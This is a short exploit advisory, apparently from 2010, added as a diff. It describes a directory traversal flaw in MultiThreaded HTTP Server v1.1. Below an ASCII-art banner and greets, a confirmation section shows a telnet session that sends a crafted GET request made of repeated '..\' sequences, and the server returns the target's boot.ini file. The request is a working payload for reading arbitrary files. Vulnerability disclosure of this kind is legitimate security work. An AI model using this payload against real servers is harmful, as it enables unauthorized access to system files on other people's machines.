@@ -1,0 +1,76 @@
+################################################################################
+#
+# +------------------------------------------------------------------------+
+# |                                 .......                                |
+# |                         ..''xxxxxxxxxxxxxxx'...                        |
+# |                    ..'xxxxxxxxxxxxxxxxxxxxxxxxxxx..                    |
+# |                 ..'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'.                 |
+# |               .'xxxxxxxxxxxxxxxxxxxxxxxxxxxx'''.......'.               |
+# |             .'xxxxxxxxxxxxxxxxxxxxx''......        ...  ..             |
+# |            .xxxxxxxxxxxxxxxxxx'...         ........      .'.           |
+# |           'xxxxxxxxxxxxxxx'......                          '.          |
+# |          'xxxxxxxxxxxxxx'..'x..                            .x.         |
+# |         .xxxxxxxxxxxx'...'..                  ...           .'         |
+# |         'xxxxxxxxx'..  .                          ..        .x.        |
+# |         xxxxxxx'.                                  ..        x.        |
+# |         xxxx'.                ....                  x        x.        |
+# |         'x'.            ...'xxxxxxx'.               x       .x.        |
+# |         .x'.         .'xxxxxxxxxxxxxx.             ''       .'         |
+# |          .xx.      .'xxxxxxxxxxxxxxxx.           .'xx'''.  .'          |
+# |           .xx..    'xxxxxxxxxxxxxxxx'          .'xxxxxxxxx''.          |
+# |            .'xx'.  .'xxxxxxxxxxxxxxx.      ..'xxxxxxxxxxxx'            |
+# |              .xxx'.  .xxxxxxxxxxxx'.    .'xxxxxxxxxxxxxx'.             |
+# |                .xxxx'.'xxxxxxxxx'.      xxx'xxxxxxxxxx'.               |
+# |                  .'xxxxxxx'....          ...xxxxxxx'.                  |
+# |                     ..'xxxxx'..         ..xxxxx'..                     |
+# |                          ....'xx'.....''''...                          |
+# |                                                                        |
+# |                    CubilFelino Security Research Labs                  |
+# |                            proudly presents...                         |
+# +------------------------------------------------------------------------+
+#
+#            MultiThreaded HTTP Server v1.1 Directory Traversal
+#
+#
+# Greets: l1l1th Conejito!, hkm, nitr0us, alt3kx, r1l0, b0rr3x, w01f, ax0us
+#         gh0st, CHiP, Jorge Mieres, Anwar (Virus Experts) and corelanc0d3r.
+#
+################################################################################
+ 
+# Exploit Title: MultiThreaded HTTP Server v1.1 Directory Traversal
+# Date: Apr 21, 2010
+# Author: chr1x
+# Software Link: http://voxel.dl.sourceforge.net/project/http/version1.1/%5BUnnamed%20release%5D/HTTPProject_fat.jar
+# Description: A simple HTTP Server for the whole world (educational institutions, organizations,small companies, student groups, personel etc..) any one can run it and serve files to their client.It is multithreaded light weight and robust HTTPServer.
+# Version: 1.1
+# Tested on: Windows XP SP3 (Spanish Edition)
+
+
+###########<CONFIRMATION>##############
+
+root@olovely:/ddpwn# telnet 192.168.1.252 80
+Trying 192.168.1.252...
+Connected to 192.168.1.252.
+Escape character is '^]'.
+GET /..\..\\..\..\\..\..\\..\..\\\boot.ini HTTP/1.0
+HTTP/1.0 200 OK
+
+
+MultiThreadedHTTPServer(GET, HEAD ,POST supported) for Zimbra implemented by rajeev kumar
+Date: Tue Apr 20 00:47:16 CDT 2010
+Content-length: 211
+Last Modified: Sun Apr 11 10:56:09 CDT 2010
+Content-type: unknown/unknown
+
+[boot loader]
+timeout=30
+default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
+[operating systems]
+multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect
+Connection closed by foreign host.
+root@olovely:/ddpwn#
+
+###########</CONFIRMATION>##############
+ 
+[CubilFelino Security Research Lab] - http://chr1x.sectester.net
+"The computer security is an art form. It's the ultimate martial art."
